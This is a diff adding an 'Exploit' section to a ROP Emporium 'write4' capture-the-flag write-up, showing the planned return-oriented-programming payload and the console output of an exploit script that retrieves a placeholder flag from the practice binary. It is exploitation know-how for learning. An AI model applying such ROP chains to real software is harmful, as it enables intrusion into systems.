@@ -205,3 +205,29 @@ $ ROPgadget --binary write4 | grep 'rdi'
 ```
 
 We've got all we need. Our payload will be : some offset to reach the return pointer, the gadgets to modify r14 and r15, the gadgets to modify rdi, and finally a pointer towards the PLT entry for the print_file() function.
+
+# Exploit
+
+Using [this script](./exploit.py) we get the flag :
+
+```console
+$ python3 exploit.py
+[*] '/home/coucou/Documents/ROP_Emporium/04_write4/write4'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/coucou/Documents/ROP_Emporium/04_write4/write4': pid 22744
+[*] Switching to interactive mode
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+$
+```
